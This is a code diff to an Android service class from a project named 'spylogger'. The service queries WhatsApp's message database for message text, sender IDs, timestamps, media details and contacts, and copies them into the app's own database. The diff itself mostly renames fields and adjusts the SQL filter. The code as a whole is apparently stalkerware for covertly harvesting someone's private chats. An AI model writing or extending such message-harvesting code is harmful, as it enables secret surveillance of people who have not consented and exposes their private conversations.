@@ -11,6 +11,7 @@ import android.util.Log;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
 import com.gravatasufoca.spylogger.dao.whatsapp.DatabaseHelperExternal;
 import com.gravatasufoca.spylogger.model.Mensagem;
+import com.gravatasufoca.spylogger.model.TipoMensagem;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.Topico;
 import com.gravatasufoca.spylogger.model.whatsapp.ChatList;
@@ -91,7 +92,7 @@ public class WhatsAppService extends Service {
 	public int onStartCommand(Intent intent, int flags, int startId) {
 
 		Log.d("WHATSLOG - FLAGS", Integer.toString(flags));
-
+		Utils.context=getApplicationContext();
 		updateMsg();
 
 		if(Utils.whatsObserver==null)
@@ -140,8 +141,7 @@ public class WhatsAppService extends Service {
 
 			for(String[] resultRaw:raws){
 				Topico topico=new Topico.TopicoBuilder()
-						.setIdReferencia(resultRaw[0])
-						.setRemoteKey(resultRaw[1])
+						.setIdReferencia(resultRaw[1])
 						.setNome(resultRaw[2])
 						.setOrdenacao(new Date(Long.parseLong(resultRaw[3]))).build();
 
@@ -149,12 +149,12 @@ public class WhatsAppService extends Service {
 			}
 			dbHelper.getTopicoDao().create(topicos);
 
-			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where _id!=-1 and _id not in( select idReferencia from localdb.mensagem )");
+			GenericRawResults<String[]> rawResults= daoMsgExternal.queryRaw("select _id,key_remote_jid,key_from_me,data,timestamp,media_wa_type,media_size,remote_resource,received_timestamp, case when raw_data is not null  then 1 else '' end from messages where key_remote_jid!='-1' and _id not in( select idReferencia from localdb.mensagem )");
 			List<Mensagem> mensagems=new ArrayList<>();
 			for(final String[] resultRaw:rawResults){
 				Topico tmpTopico=null;
 				for(Topico topico: topicos) {
-					if(topico.getRemoteKey().equals(resultRaw[1])) {
+					if(topico.getIdReferencia().equals(resultRaw[1])) {
 						tmpTopico=topico;
 						break;
 					}
@@ -168,13 +168,14 @@ public class WhatsAppService extends Service {
 						.setDataRecebida(new Date(Long.parseLong(resultRaw[8])))
 						.setTamanhoArquivo(Long.parseLong(resultRaw[6]))
 						.setTipoMidia(TipoMidia.getTipoMidia(resultRaw[5]))
+//						.setContato(Utils.getContactDisplayNameByNumber(resultRaw[7],getContentResolver()))
 						.setContato(resultRaw[7])
 						.setTopico(tmpTopico)
-						.setTemMedia(resultRaw[9] == "1").build();
+						.setTemMedia(resultRaw[9] == "1").build(TipoMensagem.WHATSAPP);
 
 				if(tmpTopico==null){
 					QueryBuilder<Topico,Integer> qb=dbHelper.getTopicoDao().queryBuilder();
-					qb.where().eq("remoteKey",resultRaw[1]);
+					qb.where().eq("idReferencia",resultRaw[1]);
 					tmpTopico=dbHelper.getTopicoDao().queryForFirst(qb.prepare());
 					mensagem.setTopico(tmpTopico);
 				}
